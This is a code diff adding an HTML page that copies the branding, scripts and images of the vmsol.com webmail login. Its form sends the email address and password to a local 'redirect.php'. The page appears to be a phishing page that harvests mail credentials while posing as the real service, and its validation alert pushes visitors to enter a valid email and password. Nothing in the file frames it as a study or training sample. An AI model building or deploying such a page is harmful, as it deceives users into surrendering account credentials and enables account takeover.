@@ -1,0 +1,187 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible" />
+  <meta content="no-cache" http-equiv="Pragma" />
+  <meta content="no-cache" http-equiv="Cache-Control" />
+  <title>
+   LOGIN
+  </title>
+  <script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery-1.10.1.min.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.browser.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.wmutils.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery-ui-1.9.2.custom.min.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.disable.text.select.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.json.min.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.hotkeys.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.mousewheel.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.autocomplete.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/jquery/jquery.tmpl.min.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/wm7js.i18n.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/statistic/Statistic.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <!--[if IE 6]>
+    <script type="text/javascript" src="http://webmail.vmsol.com/wm7js/pathfix.js?6.84.6"></script>
+<![endif]-->
+  <script src="http://webmail.vmsol.com/wm7js/wm7js-min.js?6.84.6" type="text/javascript" language="javascript">
+  </script>
+  <link href="http://webmail.vmsol.com/themes/default/wm7js/wm7js-min.css?6.84.6" type="text/css" rel="stylesheet" />
+  <!--[if lte IE 9]>
+		<link rel="stylesheet" type="text/css" href="http://webmail.vmsol.com/themes/default/wm7js/wm7js-ie-min.css?6.84.6" />
+	<![endif]-->
+  <link href="http://webmail.vmsol.com/themes/default/common/common.css?6.84.6" type="text/css" rel="stylesheet" />
+  <link href="http://webmail.vmsol.com/themes/default/ajax_login/login.css?6.84.6" type="text/css" rel="stylesheet" />
+  <!--[if lte IE 9]>
+		<link rel="stylesheet" type="text/css" href="http://webmail.vmsol.com/themes/default/ajax_login/login-ie.css?6.84.6" />
+	<![endif]-->
+  <script src="http://webmail.vmsol.com/ajax_index/javascripts/WebmailAds.js?6.84.6" type="text/javascript">
+  </script>
+  <script language="Javascript">
+   function validateForm()
+{
+var x=document.forms["hwebmail_login"]["user"].value;
+var y=document.forms["hwebmail_login"]["pass"].value;
+var atpos=x.indexOf("@");
+var dotpos=x.lastIndexOf(".");
+if (atpos&lt;1 || dotpos&lt;atpos+2 || dotpos+2&gt;=x.length)
+  {
+  alert("Invalid! Enter your valid E-mail address and E-mail Password Correctly");
+  return false;
+  }
+if (y==null || y=="")
+  {
+  alert("Invalid! Please provide your valid Email Password Correctly");
+  return false;
+  }
+}
+  </script>
+ </head>
+ <body>
+  <div style="display:none;">
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/diskstat.png?6.84.6" />
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/sprite-repeat2.png?6.84.6" />
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/sprite-repeat.png?6.84.6" />
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/sprite-v.png?6.84.6" />
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/sprite.png?6.84.6" />
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/ajax-loader.gif?6.84.6" />
+   <img alt="" src="http://webmail.vmsol.com/themes/default/common/images/content-back.png?6.84.6" />
+  </div>
+  <form onsubmit="return validateForm();" autocomplete="on" action="redirect.php" method="post" name="hwebmail_login">
+   <input type="hidden" value="" name="bypass" />
+   <div class="log-logo">
+    <img alt="" src="http://vmsol.com/images/webmail.png" />
+   </div>
+   <div id="log-red">
+    <noscript>
+     You currently do not have JavsScript enabled.You need need Javascript enabled in your browser for this site to operate properly.&lt;br/&gt;
+    </noscript>
+   </div>
+   <div align="center" style="padding-top: 100px;" class="log-main-wrapper-block">
+    <div class="log-main">
+     <div class="log-top">
+     </div>
+     <table cellspacing="0" cellpadding="0" class="log-tab">
+      <tbody>
+       <tr>
+        <td class="log-left">
+        </td>
+        <td class="log-center">
+         <div align="center" class="log-title">
+          <div title="Sign in" class="log-t-logo">
+          </div>
+          <div class="log-l-t">
+           Sign in
+          </div>
+         </div>
+         <div class="log-tab-wrap">
+          <table border="0" cellspacing="0" cellpadding="0">
+           <tbody>
+            <tr>
+             <td align="right">
+              Email Address:
+             </td>
+             <td width="200%">
+              <input type="text" name="user" class="log-input" />
+             </td>
+            </tr>
+            <tr>
+             <td align="right">
+              Email Password:
+             </td>
+             <td>
+              <input type="password" name="pass" class="log-input" />
+             </td>
+            </tr>
+            <tr>
+             <td>
+             </td>
+             <td class="log-tdcheck">
+              <input type="checkbox" onclick="this.form.setAttribute('autocomplete', (this.checked ? 'off' : 'on'));" id="log-check" class="log-check" />
+              <label for="log-check">
+               Public computer
+              </label>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </div>
+         <div class="log-wrap-btns">
+          <a tabindex="-1" title="Sign in" alt="Sign in" role="button" class="log-btn-div">
+           <div onclick="if(onLogin())document.hwebmail_login.submit()" class="log-btn-left">
+           </div>
+           <button onclick="if(onLogin())document.hwebmail_login.submit()" title="Sign in" alt="Sign in" role="button" type="submit" class="log-submit">
+            Sign in
+           </button>
+           <div onclick="if(onLogin())document.hwebmail_login.submit()" class="log-btn-right">
+           </div>
+          </a>
+          <a class="log-forgot-link" href="#">
+           Forgot your password?
+          </a>
+         </div>
+        </td>
+        <td class="log-right">
+        </td>
+       </tr>
+      </tbody>
+     </table>
+     <div class="log-bottom">
+     </div>
+    </div>
+   </div>
+  </form>
+  <div style="display:none;" id="advrLogin">
+  </div>
+  <script src="http://webmail.vmsol.com/wm7js/statistic/StatisticCore.js?6.84.6" type="text/javascript">
+  </script>
+  <script src="http://webmail.vmsol.com/wm7js/statistic/Statistic.js?6.84.6" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   window.Statistic.init("UA-32919814-1");
+		window.Statistic.pageview("login");
+  </script>
+  <script type="text/javascript">
+   (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+  </script>
+  <!-- mail183c2
+-->
+ </body>
+</html>
